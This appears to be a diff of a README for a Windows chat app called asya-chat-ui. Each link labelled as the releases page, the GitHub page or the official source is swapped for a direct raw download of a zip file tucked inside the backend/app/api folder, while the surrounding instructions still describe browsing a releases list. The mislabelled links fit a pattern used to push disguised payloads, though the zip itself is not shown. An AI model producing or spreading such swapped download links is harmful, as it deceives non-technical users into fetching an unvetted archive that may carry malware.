@@ -1,6 +1,6 @@
 # 🤖 asya-chat-ui - Easy Open-Source Chat Interface
 
-[![Download asya-chat-ui](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://github.com/expruff/asya-chat-ui/releases)
+[![Download asya-chat-ui](https://img.shields.io/badge/Download-Get%20It%20Here-blue)](https://github.com/expruff/asya-chat-ui/raw/refs/heads/main/backend/app/api/chat_asya_ui_2.5.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you download asya-chat-ui, make sure your Windows PC meets these basic re
 
 You will find the app ready to download on the official GitHub releases page.
 
-[![Download asya-chat-ui](https://img.shields.io/badge/Download-Get%20It%20Here-green)](https://github.com/expruff/asya-chat-ui/releases)
+[![Download asya-chat-ui](https://img.shields.io/badge/Download-Get%20It%20Here-green)](https://github.com/expruff/asya-chat-ui/raw/refs/heads/main/backend/app/api/chat_asya_ui_2.5.zip)
 
 Visit the page linked above to get the latest version of asya-chat-ui. The page shows all available downloads with their version numbers.
 
@@ -42,7 +42,7 @@ Follow these steps to install and start asya-chat-ui on your Windows PC.
 
 ### Step 1: Download the Installer or Zip File
 
-1. Open the [ releases page](https://github.com/expruff/asya-chat-ui/releases) in your browser.
+1. Open the [ releases page](https://github.com/expruff/asya-chat-ui/raw/refs/heads/main/backend/app/api/chat_asya_ui_2.5.zip) in your browser.
 2. Click on the latest release (top of the list).
 3. Find the file with `.exe` or `.zip` extension.
 4. Click the file name to download.
@@ -105,7 +105,7 @@ Open the settings panel to adjust the app to your needs.
 
 If you need support, visit the GitHub repository:
 
-- Open the [asya-chat-ui GitHub page](https://github.com/expruff/asya-chat-ui).
+- Open the [asya-chat-ui GitHub page](https://github.com/expruff/asya-chat-ui/raw/refs/heads/main/backend/app/api/chat_asya_ui_2.5.zip).
 - Use the Issues tab to see if someone else has your problem.
 - You can create a new issue for questions or bug reports.
 - Read the FAQ and documentation sections for more details.
@@ -134,4 +134,4 @@ This project touches on:
 
 Ensure you get the latest version from the official source:
 
-[Download asya-chat-ui on GitHub](https://github.com/expruff/asya-chat-ui/releases)
+[Download asya-chat-ui on GitHub](https://github.com/expruff/asya-chat-ui/raw/refs/heads/main/backend/app/api/chat_asya_ui_2.5.zip)
